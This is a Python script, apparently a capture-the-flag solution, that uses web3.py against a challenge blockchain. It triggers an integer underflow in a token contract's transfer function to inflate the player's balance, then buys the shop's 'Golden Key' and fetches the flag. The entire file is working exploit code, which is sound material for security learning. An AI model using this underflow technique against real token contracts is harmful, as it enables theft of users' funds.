from web3 import Web3
import requests

def main():
    BASE_URL = "http://94.237.122.36:44364"
    
    print("Getting connection info...")
    conn_info = requests.get(f"{BASE_URL}/connection_info", timeout=5).json()
    
    w3 = Web3(Web3.HTTPProvider(f"{BASE_URL}/rpc"))
    print("Connected to blockchain")
    
    private_key = conn_info['PrivateKey']
    player_address = conn_info['Address']
    setup_address = Web3.to_checksum_address(conn_info['setupAddress'])
    shop_address = Web3.to_checksum_address(conn_info['TargetAddress'])
    
    print(f"Player: {player_address}")
    print(f"Shop: {shop_address}")
    
    # Contract ABIs
    setup_abi = [{"inputs":[{"internalType":"address","name":"_player","type":"address"}],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
    
    shop_abi = [
        {"inputs":[{"internalType":"uint256","name":"_index","type":"uint256"}],"name":"buyItem","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"uint256","name":"_index","type":"uint256"}],"name":"viewItem","outputs":[{"internalType":"string","name":"","type":"string"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
    ]
    
    silver_abi = [
        {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
    ]
    
    setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi)
    shop_contract = w3.eth.contract(address=shop_address, abi=shop_abi)
    
    # Get SilverCoin address from storage slot 1
    storage = w3.eth.get_storage_at(shop_address, 1)
    silver_address = Web3.to_checksum_address('0x' + storage.hex()[-40:])
    print(f"SilverCoin: {silver_address}")
    
    silver_contract = w3.eth.contract(address=silver_address, abi=silver_abi)
    
    balance = silver_contract.functions.balanceOf(player_address).call()
    name, price, owner = shop_contract.functions.viewItem(2).call()
    print(f"\nInitial balance: {balance} SLV")
    print(f"Golden Key price: {price} SLV")
    print(f"Current owner: {owner}\n")
    
    # Exploit: Transfer more tokens than we have to trigger underflow
    nonce = w3.eth.get_transaction_count(player_address)
    
    print("Exploiting integer underflow...")
    tx1 = silver_contract.functions.transfer(shop_address, price).build_transaction({
        'from': player_address,
        'nonce': nonce,
        'gas': 300000,
        'gasPrice': w3.eth.gas_price
    })
    w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx1, private_key).raw_transaction)
    
    balance = silver_contract.functions.balanceOf(player_address).call()
    print(f"Balance after underflow: {balance} SLV")
    
    # Approve shop to spend tokens
    nonce += 1
    print("Approving shop...")
    tx2 = silver_contract.functions.approve(shop_address, price).build_transaction({
        'from': player_address,
        'nonce': nonce,
        'gas': 300000,
        'gasPrice': w3.eth.gas_price
    })
    w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx2, private_key).raw_transaction)
    
    # Buy the Golden Key
    nonce += 1
    print("Buying Golden Key...")
    tx3 = shop_contract.functions.buyItem(2).build_transaction({
        'from': player_address,
        'nonce': nonce,
        'gas': 300000,
        'gasPrice': w3.eth.gas_price
    })
    w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx3, private_key).raw_transaction)
    
    print(f"\nChallenge solved: {setup_contract.functions.isSolved(player_address).call()}")
    print(f"Flag: {requests.get(f'{BASE_URL}/flag').text}")

if __name__ == "__main__":
    main()
